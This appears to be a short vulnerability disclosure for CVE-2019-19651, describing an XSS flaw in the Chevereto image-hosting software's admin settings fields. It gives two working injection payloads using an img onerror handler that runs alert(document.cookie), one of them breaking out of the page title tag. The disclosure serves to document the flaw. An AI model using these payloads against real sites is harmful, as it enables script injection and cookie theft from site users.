# CVE-2019-19651
Chevereto reflected XSS in Website Name, doctitle, and description - 1.0.0 - 1.1.4 Free, &lt;= 3.13.5 Core

# Dashboard -> Settings -> Website name, Website doctitle, Website description

Putting this in will reflect on the whole site for all the users

```
">Chevt<img src=x onerror=alert(document.cookie)><"
```

It will reflect on different parts of the site, so if you want it to execute after <title> in the header you can do

```
Chevereto</title>Chevt<img src=x onerror=alert(document.cookie)><title>
```

</br>
<kbd>
  <img src="/xss-1.png?raw=true">
</kbd>
